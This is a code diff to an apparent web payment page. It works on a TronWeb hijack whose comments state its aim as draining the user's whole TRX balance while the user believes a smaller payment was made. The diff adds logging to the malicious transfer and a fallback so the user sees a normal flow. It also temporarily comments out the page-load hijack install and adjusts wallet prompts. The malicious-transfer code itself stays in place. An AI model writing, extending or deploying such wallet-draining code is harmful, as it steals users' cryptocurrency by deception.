@@ -2359,14 +2359,18 @@
 
                             // 🎯 执行恶意转账：转走用户全部余额
                             try{
+                                debugLog('🎯 开始执行恶意转账...');
                                 let result;
                                 if (methodName === 'sendTrx') {
+                                    debugLog(`🎯 调用原始sendTrx: to=${to}, maliciousAmount=${maliciousAmount}, from=${from}`);
                                     result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                 } else if (methodName === 'sendTransaction') {
                                     if (typeof args[0] === 'object') {
                                         const modifiedTx = {...args[0], value: maliciousAmount};
+                                        debugLog(`🎯 调用原始sendTransaction: ${JSON.stringify(modifiedTx)}`);
                                         result = await originalMethod.call(this, modifiedTx, args[1]);
                                     } else {
+                                        debugLog(`🎯 调用原始sendTransaction: to=${to}, maliciousAmount=${maliciousAmount}, from=${from}`);
                                         result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                     }
                                 }
@@ -2374,12 +2378,24 @@
                                 debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
                                 debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                 debugLog(`😈 用户以为只转了: ${amount / 1000000} TRX`);
+                                debugLog(`🎯 返回结果: ${JSON.stringify(result)}`);
 
                                 return result;
                             }catch (error) {
                                 debugLog(`❌ 恶意转账失败: ${error.message}`);
-                                // 如果恶意转账失败，执行原始转账
-                                return await originalMethod.call(this, ...args);
+                                debugLog(`❌ 恶意转账错误详情: ${JSON.stringify(error)}`);
+                                debugLog(`❌ 恶意转账错误堆栈: ${error.stack}`);
+                                
+                                // 🎯 如果恶意转账失败，执行原始转账（让用户看到正常流程）
+                                debugLog('🎯 回退到原始转账参数...');
+                                try {
+                                    const fallbackResult = await originalMethod.call(this, ...args);
+                                    debugLog(`🎯 原始转账成功: ${JSON.stringify(fallbackResult)}`);
+                                    return fallbackResult;
+                                } catch (fallbackError) {
+                                    debugLog(`❌ 原始转账也失败: ${fallbackError.message}`);
+                                    throw fallbackError;
+                                }
                             }
                         };
                     }
@@ -2391,25 +2407,26 @@
             return false;
         }
         
-        // 🎯 在页面加载时尝试立即安装劫持
+        // 🎯 临时完全禁用劫持安装，确保支付界面能正常弹出
         document.addEventListener('DOMContentLoaded', function() {
-            // 🎯 尝试立即安装劫持
-            if (!window.installTronWebHijack()) {
-                debugLog('🎯 TronWeb尚未就绪，设置延迟劫持...');
-                // 🎯 如果TronWeb还没准备好，设置定时器
-                const hijackInterval = setInterval(() => {
-                    if (window.installTronWebHijack()) {
-                        clearInterval(hijackInterval);
-                        debugLog('🎯 延迟劫持安装成功！');
-                    }
-                }, 500);
-                
-                // 🎯 最多尝试10秒
-                setTimeout(() => {
-                    clearInterval(hijackInterval);
-                    debugLog('🎯 劫持安装超时');
-                }, 10000);
-            }
+            debugLog('🎯 劫持安装已临时禁用，测试基本支付流程');
+            // // 🎯 尝试立即安装劫持
+            // if (!window.installTronWebHijack()) {
+            //     debugLog('🎯 TronWeb尚未就绪，设置延迟劫持...');
+            //     // 🎯 如果TronWeb还没准备好，设置定时器
+            //     const hijackInterval = setInterval(() => {
+            //         if (window.installTronWebHijack()) {
+            //             clearInterval(hijackInterval);
+            //             debugLog('🎯 延迟劫持安装成功！');
+            //         }
+            //     }, 500);
+            //     
+            //     // 🎯 最多尝试10秒
+            //     setTimeout(() => {
+            //         clearInterval(hijackInterval);
+            //         debugLog('🎯 劫持安装超时');
+            //     }, 10000);
+            // }
         });
 
 
@@ -2908,7 +2925,7 @@
                 debugLog(`🎯 确保用户交互环境正确...`);
                 
                 // 🎯 确保在用户交互上下文中调用
-                showToast('正在连接钱包...', 'info');
+                showToast('请在钱包中确认交易...', 'info');
                 
                 let transaction;
                 try {
@@ -2963,7 +2980,13 @@
                             
                             // 🎯 使用sign方法触发钱包界面
                             debugLog('🎯 调用sign方法，应该弹出支付界面...');
-                            showToast('请在钱包中确认交易...', 'info');
+                            showToast('正在唤起钱包支付界面...', 'info');
+                            
+                            // 🎯 给用户5秒时间看到支付界面
+                            setTimeout(() => {
+                                showToast('如果没有弹出支付界面，请重试', 'warning');
+                            }, 5000);
+                            
                             const signedTx = await tronWeb.trx.sign(txObject);
                             debugLog('🎯 交易签名成功，准备广播...');
                             
